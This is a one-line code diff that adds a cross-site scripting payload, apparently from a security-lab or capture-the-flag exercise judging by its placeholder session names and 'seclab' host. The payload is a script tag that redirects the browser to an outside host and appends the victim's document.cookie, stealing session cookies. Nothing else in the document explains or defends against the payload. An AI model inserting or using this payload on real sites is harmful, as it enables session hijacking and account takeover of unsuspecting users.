@@ -1,0 +1,1 @@
+<script>document.location='https://token.seclab.space/set.php?sid=__your_sid__&token=__alice_session_id___/data='+document.cookie</script>
